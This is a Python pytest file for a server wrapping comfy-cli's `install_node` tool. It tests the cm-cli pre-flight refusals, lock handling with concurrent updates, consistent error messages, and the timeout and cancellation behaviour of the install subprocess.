def test_the_busy_refusal_names_every_lock_sharer(patched_plain_run):
    """The holder may be an update OR a version switch; say both.

    A caller told only about "an update" goes hunting for an in-flight call that
    may not exist. `update_comfyui` and `switch_comfyui_version` name a node
    install in their own refusals for the same reason.
    """
    patched_plain_run(0, stderr="done")

    assert server._UPDATE_LOCK.acquire(blocking=False)
    try:
        with pytest.raises(server.ComfyCliError) as excinfo:
            _install(["comfyui-impact-pack"], ctx=_FakeCtx())
    finally:
        server._UPDATE_LOCK.release()

    message = str(excinfo.value)
    assert "version switch" in message
    assert "Nothing was installed." in message


# --- the cm-cli pre-flight --------------------------------------------------
#
# `comfy node install` shells out to ComfyUI-Manager's `cm-cli`, and comfy-cli's
# `execute_cm_cli` refuses outright — before it downloads anything — when
# `cm_cli` does not import from the workspace Python. A LEGACY CLONE of Manager
# under `custom_nodes/` is exactly that install: fully functional for ComfyUI
# itself, and unusable by every cm-cli-backed verb. Verified against comfy-cli
# 1.14.0 (this server's floor) on a workspace of that shape: `comfy env` reports
# `manager_detected: "legacy-clone"`, and `comfy node install <pack>
# --exit-on-fail` exits 1 with "ComfyUI-Manager not found. 'cm-cli' command is
# not available." having installed nothing.
#
# What these lock in is the ORDER: the refusal happens before the elicitation, so
# a user is never asked to approve downloading and running third-party code on a
# call that cannot succeed.


def test_a_legacy_clone_refuses_before_the_prompt(patched_plain_run, monkeypatch):
    """The ticket case: Manager on disk, `cm_cli` not importable in the venv."""
    calls = patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(
        server,
        "_workspace_report",
        _env(manager_mode="legacy", manager_detected="legacy-clone"),
    )
    ctx = _FakeCtx()

    result = _install(["comfyui-impact-pack"], ctx=ctx)

    # No prompt, and no `comfy node install`: the two halves of "never authorize
    # an impossible operation".
    assert ctx.elicitations == []
    assert calls == []
    assert result["unsupported"] is True
    message = result["error"]
    assert "LEGACY CLONE" in message
    assert "Nothing was installed" in message
    # The remedy is the venv package, not "install ComfyUI-Manager" unqualified —
    # the user demonstrably HAS Manager, which is why the old raw cm-cli error
    # read as nonsense on this install.
    assert "workspace VENV" in message
    assert "comfyui_manager" in message


def test_no_manager_at_all_refuses_and_says_so(patched_plain_run, monkeypatch):
    """The other cm-cli-less shape, described as itself rather than as a clone."""
    calls = patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(
        server,
        "_workspace_report",
        _env(manager_mode="not-installed", manager_detected="none"),
    )
    ctx = _FakeCtx()

    result = _install(["comfyui-impact-pack"], ctx=ctx)

    assert ctx.elicitations == []
    assert calls == []
    assert result["unsupported"] is True
    assert "does not have ComfyUI-Manager at all" in result["error"]
    assert "LEGACY CLONE" not in result["error"]


def test_the_refusal_routes_instead_of_dead_ending(patched_plain_run, monkeypatch):
    """A denial must send the user somewhere that WORKS, and nowhere that does not.

    Manager's own UI keeps serving from a legacy clone, so it is named. A terminal
    `comfy node install` is the identical command through the identical `cm-cli`,
    so it is named as NOT a way around this rather than offered as the escape
    hatch — sending the user there would be a second guaranteed failure.
    """
    patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(
        server, "_workspace_report", _env(manager_detected="legacy-clone")
    )

    message = _install(["comfyui-impact-pack"], ctx=_FakeCtx())["error"]

    assert "Manager's own UI in the running ComfyUI can still install packs" in message
    assert "is NOT a way around this" in message


@pytest.mark.parametrize(
    "workspace",
    [
        # No `manager_detected` at all — an engine that reports only the mode.
        {"manager_mode": "legacy"},
        {"manager_mode": "not-installed"},
        # `manager_detected` wins where the two disagree: the mode is a per-user
        # CONFIG key comfy-cli leaves alone when it reads `disable` or anything
        # it does not recognise, so it can stay silent about a Manager that is
        # missing. The detection is the reconciliation's input, not its output.
        {"manager_mode": "disable", "manager_detected": "legacy-clone"},
        {"manager_mode": "enable-gui", "manager_detected": "none"},
    ],
)
def test_every_cm_cli_less_report_refuses(patched_plain_run, monkeypatch, workspace):
    """Both fields are read, and the authoritative one is read first."""
    calls = patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(server, "_workspace_report", _env(**workspace))
    ctx = _FakeCtx()

    assert _install(["comfyui-impact-pack"], ctx=ctx)["unsupported"] is True
    assert ctx.elicitations == []
    assert calls == []


@pytest.mark.parametrize("mode", ["legacy", "not-installed"])
def test_the_mode_fallback_refuses_without_naming_a_shape(
    patched_plain_run, monkeypatch, mode
):
    """Neither mode value identifies WHICH cm-cli-less shape this install is.

    `server_info`'s own docstring records that a legacy clone under
    `custom_nodes/` also reports `manager_mode: "not-installed"` — and this
    fallback runs only on engines old enough to lack `manager_detected`, which is
    exactly where that conflation is likeliest. So a clone user must not be told
    they have no Manager and denied the Manager-UI route that still works for
    them. The refusal is right; naming the cause on this signal is not.
    """
    patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(server, "_workspace_report", _env(manager_mode=mode))

    message = _install(["comfyui-impact-pack"], ctx=_FakeCtx())["error"]

    assert "either it is not installed at all, or it is a legacy clone" in message
    assert "does not have ComfyUI-Manager at all" not in message
    # …and the route out of the shape it MIGHT be is still offered, conditionally.
    assert "If this install is a legacy clone" in message
    assert "Manager's own UI in the running ComfyUI can still install packs" in message


@pytest.mark.parametrize(
    "workspace",
    [
        # cm-cli is usable — the ordinary case, and the one `manager_detected`
        # answers outright whatever the stale config mode says.
        {"manager_detected": "venv-package"},
        {"manager_detected": "venv-package", "manager_mode": "not-installed"},
        # …and every report that is merely UNINFORMATIVE. None of these is
        # evidence the install would fail, so none may block it.
        {"manager_mode": "enable-gui"},
        {"manager_mode": "disable"},
        {"manager_mode": "disable-gui"},
        {"manager_detected": "a-shape-from-a-later-comfy-cli"},
        # The combination that made the fail-open contract a lie: a vocabulary
        # from a LATER comfy-cli — which may well name a perfectly usable Manager
        # — alongside a stale config mode. An unrecognised detection must not
        # fall through to the mode; the field ANSWERED, and a `"legacy"` string
        # nobody has corrected does not get to overrule it and refuse an install
        # that works. Non-string shapes fail open by the same rule.
        {
            "manager_detected": "a-shape-from-a-later-comfy-cli",
            "manager_mode": "legacy",
        },
        {
            "manager_detected": "a-shape-from-a-later-comfy-cli",
            "manager_mode": "not-installed",
        },
        {"manager_detected": ["not", "a", "string"], "manager_mode": "not-installed"},
        {"manager_detected": None, "manager_mode": "legacy"},
        {},
    ],
)
def test_an_uninformative_or_healthy_report_installs_anyway(
    patched_plain_run, monkeypatch, workspace
):
    """The pre-flight FAILS OPEN — the opposite of the version switch's check.

    That check guards against DOING something destructive, so it refuses when it
    cannot tell. This one only improves an error message, and comfy-cli's own
    refusal is still behind it, so inventing a refusal here would block installs
    that work. Every uncertain answer proceeds.
    """
    calls = patched_plain_run(0, stderr="installed")
    monkeypatch.setattr(server, "_workspace_report", _env(**workspace))

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert result["installed"] == ["comfyui-impact-pack"]
    assert len(calls) == 1
    assert calls[0]["cmd"][-3:] == ["install", "comfyui-impact-pack", "--exit-on-fail"]


@pytest.mark.parametrize(
    "run_kwargs",
    [
        # `comfy env` failed outright, or answered something that is not an
        # envelope. Both raise `ComfyCliError` out of `_run_comfy`.
        {"stdout": "not json at all", "returncode": 1},
        {"stdout": envelope(ok=False, error={"code": "boom", "message": "no"})},
        # It succeeded, but said nothing this probe can use.
        {"stdout": envelope(data={"server": {"running": False}})},
        {"stdout": envelope(data={"workspace": None})},
        {"stdout": envelope(data=["not a mapping at all"])},
        # The spawn itself failed.
        {"raises": OSError("no such binary")},
    ],
)
def test_a_probe_that_cannot_answer_reads_as_no_gap(
    patched_run, monkeypatch, run_kwargs
):
    """`_workspace_report` swallows every failure — it exists to word an error.

    Driven at the probe rather than through the tool because these are the shapes
    the tool's stub short-circuits: an unparseable body, an error envelope, a
    payload with no `workspace`, a spawn that never started.
    """
    patched_run(**run_kwargs)
    monkeypatch.setattr(server, "_workspace_report", _REAL_WORKSPACE_REPORT)

    assert server._workspace_report() is None
    assert server._cm_cli_unavailable_reason() is None


def test_the_preflight_reads_comfy_env_and_never_spawns_the_install(
    patched_run, monkeypatch
):
    """End to end through the real probe: comfy-cli's own `env` payload refuses.

    The stub above short-circuits the `comfy env` read, which is what keeps the
    rest of this file about the install. This one puts the real one back, so
    `workspace.manager_detected` is read off an actual `envelope/1` body the way
    it arrives from `comfy env` — and asserts the thing the ordering exists for:
    `node install` is never spawned.
    """
    calls = patched_run(
        envelope(
            data={
                "server": {"running": False, "url": None},
                "workspace": {
                    "path": "/ws",
                    "manager_mode": "legacy",
                    "manager_detected": "legacy-clone",
                },
            }
        )
    )
    monkeypatch.setattr(server, "_workspace_report", _REAL_WORKSPACE_REPORT)
    ctx = _FakeCtx()

    assert _install(["comfyui-impact-pack"], ctx=ctx)["unsupported"] is True

    assert ctx.elicitations == []
    assert calls, "the pre-flight must actually ask comfy-cli"
    assert calls[0]["cmd"][:5] == [
        server.COMFY_BIN,
        "--json",
        "--where",
        "local",
        "env",
    ]
    # The probe may run more than one child (`comfy env` plus `server_info`'s own
    # freshness probe); what must never appear is the install.
    assert not any("install" in call["cmd"] for call in calls)


def test_a_failure_the_preflight_cannot_predict_is_still_relayed_raw(
    patched_plain_run,
):
    """The pre-flight is an addition, not a replacement, for comfy-cli's error.

    An install can still fail inside `cm-cli` for reasons `comfy env` cannot
    predict — an unreachable channel, a broken pack, a dependency conflict.
    comfy-cli's own message is what the caller gets.
    """
    patched_plain_run(1, stderr="\nFailed to install: dependency conflict.\n")

    with pytest.raises(server.ComfyCliError, match="dependency conflict"):
        _install(["comfyui-impact-pack"], ctx=_FakeCtx())


def test_a_cm_cli_gap_the_preflight_failed_open_on_degrades_the_same_way(
    patched_plain_run, monkeypatch
):
    """ONE environment must not answer in TWO shapes.

    The pre-flight fails open, so an unreadable `comfy env` — a probe that timed
    out, an engine reporting neither field — lets the install run and hit the very
    gap the probe could not see. Callers are told to check `unsupported` before
    indexing `["installed"]`; if that path raised a raw `ComfyCliError` instead,
    the contract would hold only when a subprocess happened to succeed. So
    comfy-cli's own refusal maps to the same degrade, and — since that message
    reads identically for a missing Manager and for a clone — claims no shape.
    """
    calls = patched_plain_run(
        1, stderr="\nComfyUI-Manager not found. 'cm-cli' command is not available.\n"
    )
    monkeypatch.setattr(server, "_workspace_report", lambda: None)
    ctx = _FakeCtx()

    result = _install(["comfyui-impact-pack"], ctx=ctx)

    assert result["unsupported"] is True
    assert "installed" not in result
    assert server._MANAGER_VENV_REMEDY in result["error"]
    assert (
        "either it is not installed at all, or it is a legacy clone" in result["error"]
    )
    # It failed open, so the user WAS prompted and the install WAS spawned — this
    # degrade is after the fact, not instead of the attempt.
    assert len(ctx.elicitations) == 1
    assert len(calls) == 1


def test_an_update_that_starts_during_the_probe_refuses_before_the_prompt(
    patched_plain_run, monkeypatch
):
    """The peek is re-taken after the probe, because the probe is SLOW.

    The pre-flight is a subprocess with a 60-second ceiling, sitting between the
    first `_UPDATE_LOCK` peek and the prompt. An update that starts inside that
    window would otherwise be discovered only by the authoritative acquire — i.e.
    after the user had already approved running third-party code, which is the
    outcome the peek exists to prevent.
    """
    calls = patched_plain_run(0, stderr="installed")

    def _probe_during_which_an_update_starts():
        server._UPDATE_LOCK.acquire()
        return {"manager_detected": "venv-package"}

    monkeypatch.setattr(
        server, "_workspace_report", _probe_during_which_an_update_starts
    )
    ctx = _FakeCtx()

    try:
        with pytest.raises(server.ComfyCliError, match="already running"):
            _install(["comfyui-impact-pack"], ctx=ctx)
    finally:
        server._UPDATE_LOCK.release()

    assert ctx.elicitations == []
    assert calls == []


def test_both_cm_cli_tools_describe_the_same_install_the_same_way(
    patched_async_run, monkeypatch
):
    """`install_node` and `workflow_deps` fail on ONE environment — one story.

    They reach the verdict differently — this tool pre-flights `comfy env`, that
    one reads comfy-cli's refusal after the fact — which is exactly how two
    messages drift into describing the same machine as two different machines.
    Sharing the remedy makes that structural rather than a matter of keeping two
    literals in step.
    """
    monkeypatch.setattr(
        server, "_workspace_report", _env(manager_detected="legacy-clone")
    )
    install_message = _install(["comfyui-impact-pack"], ctx=_FakeCtx())["error"]

    # `patched_async_run`, not `patched_run`: `workflow_deps` rides
    # `_run_comfy_async` so a cancelling client kills its 300s child.
    patched_async_run(
        "",
        returncode=1,
        stderr="\nComfyUI-Manager not found. 'cm-cli' command is not available.\n",
    )
    deps_message = asyncio.run(server.workflow_deps("/tmp/flux.json"))["error"]

    assert server._MANAGER_VENV_REMEDY in install_message
    assert server._MANAGER_VENV_REMEDY in deps_message
    # And neither claims more than it knows: the pre-flight saw the clone, the
    # post-hoc read cannot tell a clone from an absent Manager and says so.
    assert "LEGACY CLONE" in install_message
    assert "either it is not installed at all, or it is a legacy clone" in deps_message


# --- discoverability --------------------------------------------------------


def test_the_handshake_instructions_teach_the_install_flow():
    """An agent reads `INSTRUCTIONS` once, at handshake — it must find the door.

    Before this, the missing-node guidance ended at "tell the USER what is
    missing", which is precisely the dead end this tool removes: an agent that
    learned the wall at handshake never discovers the tool that resolves it. The
    restart is part of the same clause because installing without restarting looks
    like a no-op from `search_nodes`.
    """
    flat = " ".join(server.INSTRUCTIONS.split())

    assert "install_node" in flat
    assert "`install_node` -> `restart_comfyui`" in flat


def test_the_module_docstring_lists_the_tool():
    """The inventory at the top of `server.py` is the other place a reader looks."""
    assert "install_node" in server.__doc__


# --- the async plumbing the gate required -----------------------------------


def test_the_install_stays_off_the_default_executor(patched_plain_run):
    """A 30-minute blocking call on asyncio's shared pool starves everything else.

    `_UPDATE_EXECUTOR` and `_SWITCH_EXECUTOR` exist for exactly this reason, and an
    install runs as long as either: on the default pool it would park the only
    worker every other `to_thread` caller in the process shares.
    """
    patched_plain_run(0, stderr="done")
    threads: list[str] = []

    def _capture(*args, **kwargs):
        threads.append(threading.current_thread().name)
        return {"ok": True}

    with mock.patch.object(server, "_run_comfy", _capture):
        _install(
            ["comfyui-impact-pack"],
            confirm_install=True,
            ctx=_FakeCtx(supports_elicitation=False),
        )

    assert threads and all(name.startswith("comfy-node-install") for name in threads)


def test_the_timeout_is_generous(patched_plain_run):
    """Resolving and installing a pack's dependencies is minutes, not seconds."""
    calls = patched_plain_run(0, stderr="done")

    _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert calls[0]["timeout"] == server._INSTALL_TIMEOUT
    assert calls[0]["timeout"] >= 1800.0


def test_the_lock_is_held_until_the_subprocess_finishes(patched_plain_run):
    """Cancelling the REQUEST must not hand the lock to a second concurrent pip.

    Cancellation raises `CancelledError` at the await but neither interrupts the
    worker thread nor kills the `comfy node install` it spawned, so pip keeps
    resolving. If the lock were released in a `finally` here, a retry, an
    `update_comfyui` or a `switch_comfyui_version` would acquire it and run a
    second install against the same venv — the corrupted environment the lock
    exists to prevent. The done-callback ties the release to the JOB's lifetime
    instead, so this is what fails if anyone "simplifies" it back to a `finally`.
    """
    started = threading.Event()
    finish = threading.Event()

    def _slow(*_args, **_kwargs):
        started.set()
        finish.wait(5)
        return {"ok": True}

    patched_plain_run(0, stderr="done")

    async def _drive():
        task = asyncio.ensure_future(
            server.install_node(["comfyui-impact-pack"], confirm_install=True, ctx=None)
        )
        await asyncio.to_thread(started.wait, 5)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        # The abandoned install is still running, so the lock must still be taken.
        assert not server._UPDATE_LOCK.acquire(blocking=False)
        finish.set()
        # ...and released once it actually ends, rather than leaked forever.
        for _ in range(500):
            if server._UPDATE_LOCK.acquire(blocking=False):
                server._UPDATE_LOCK.release()
                return
            await asyncio.sleep(0.01)
        raise AssertionError("the lock was never released")

    with mock.patch.object(server, "_run_comfy", _slow):
        try:
            asyncio.run(_drive())
        finally:
            finish.set()
